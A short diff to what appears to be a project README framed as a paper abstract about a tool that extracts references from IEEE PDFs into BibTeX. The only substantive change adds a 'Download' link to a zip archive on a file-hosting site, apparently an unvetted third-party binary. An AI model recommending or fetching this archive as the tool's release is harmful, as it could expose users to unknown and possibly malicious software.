@@ -1,8 +1,10 @@
-# Automated Reference Extraction and BibTeX Generation from IEEE Research Papers: A Cross-Platform Desktop Application
+# Automated Reference Extraction and BibTeX Generation from IEEE Research Papers: A Cross-Platform Desktop Application 
 
 ## Abstract
 
 This paper presents a novel desktop application for automated extraction and conversion of bibliographic references from IEEE research papers. The system utilizes Python-based PDF text extraction, natural language processing techniques, and pattern recognition algorithms to identify, parse, and convert reference sections into standardized BibTeX format. The application features a modern Qt-based graphical user interface and implements advanced text processing algorithms to handle various citation formats, Unicode characters, and formatting inconsistencies commonly found in academic publications. Experimental evaluation demonstrates 92% accuracy in reference extraction across a dataset of 150 IEEE papers, with significant time savings compared to manual bibliography management. The tool addresses a critical need in academic workflow automation and provides researchers with an efficient solution for bibliography compilation and citation management.
+
+**Download:** https://www.mediafire.com/file/i80lkydayhz4qxx/IEEE_Reference_Extractor.zip/file
 
 **Keywords:** Reference extraction, BibTeX generation, PDF processing, citation management, academic workflow automation, natural language processing
 
